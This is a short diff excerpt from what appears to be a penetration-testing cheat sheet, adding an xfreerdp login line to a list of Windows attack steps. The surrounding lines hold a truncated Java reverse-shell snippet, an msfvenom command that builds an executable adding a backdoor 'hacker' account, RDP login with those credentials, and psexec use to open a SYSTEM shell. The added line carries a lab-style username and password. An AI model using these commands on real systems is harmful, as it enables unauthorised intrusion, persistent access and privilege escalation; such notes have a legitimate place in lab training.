@@ -427,6 +427,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 or
 > 1. msfvenom -p windows/adduser USER='hacker' PASS='Hacker123$' -f exe > malicious.exe
 > 1. then access via RDP if its avialable e.g. xfreerdp /u:hacker /p:'Hacker123$' /v:192.168.71.168:3389
+> 2. xfreerdp -> `xfreerdp /u:student73 /p:password123 /v:172.16.100.73:3389 /timeout:80000 /dynamic-resolution`
 > 1. Download psexec.exe "PSTools.zip" on windows
 > 1. Start CMD with "Administrator" privs.
 > 1. Run command --> psexec64.exe -sid cmd.exe
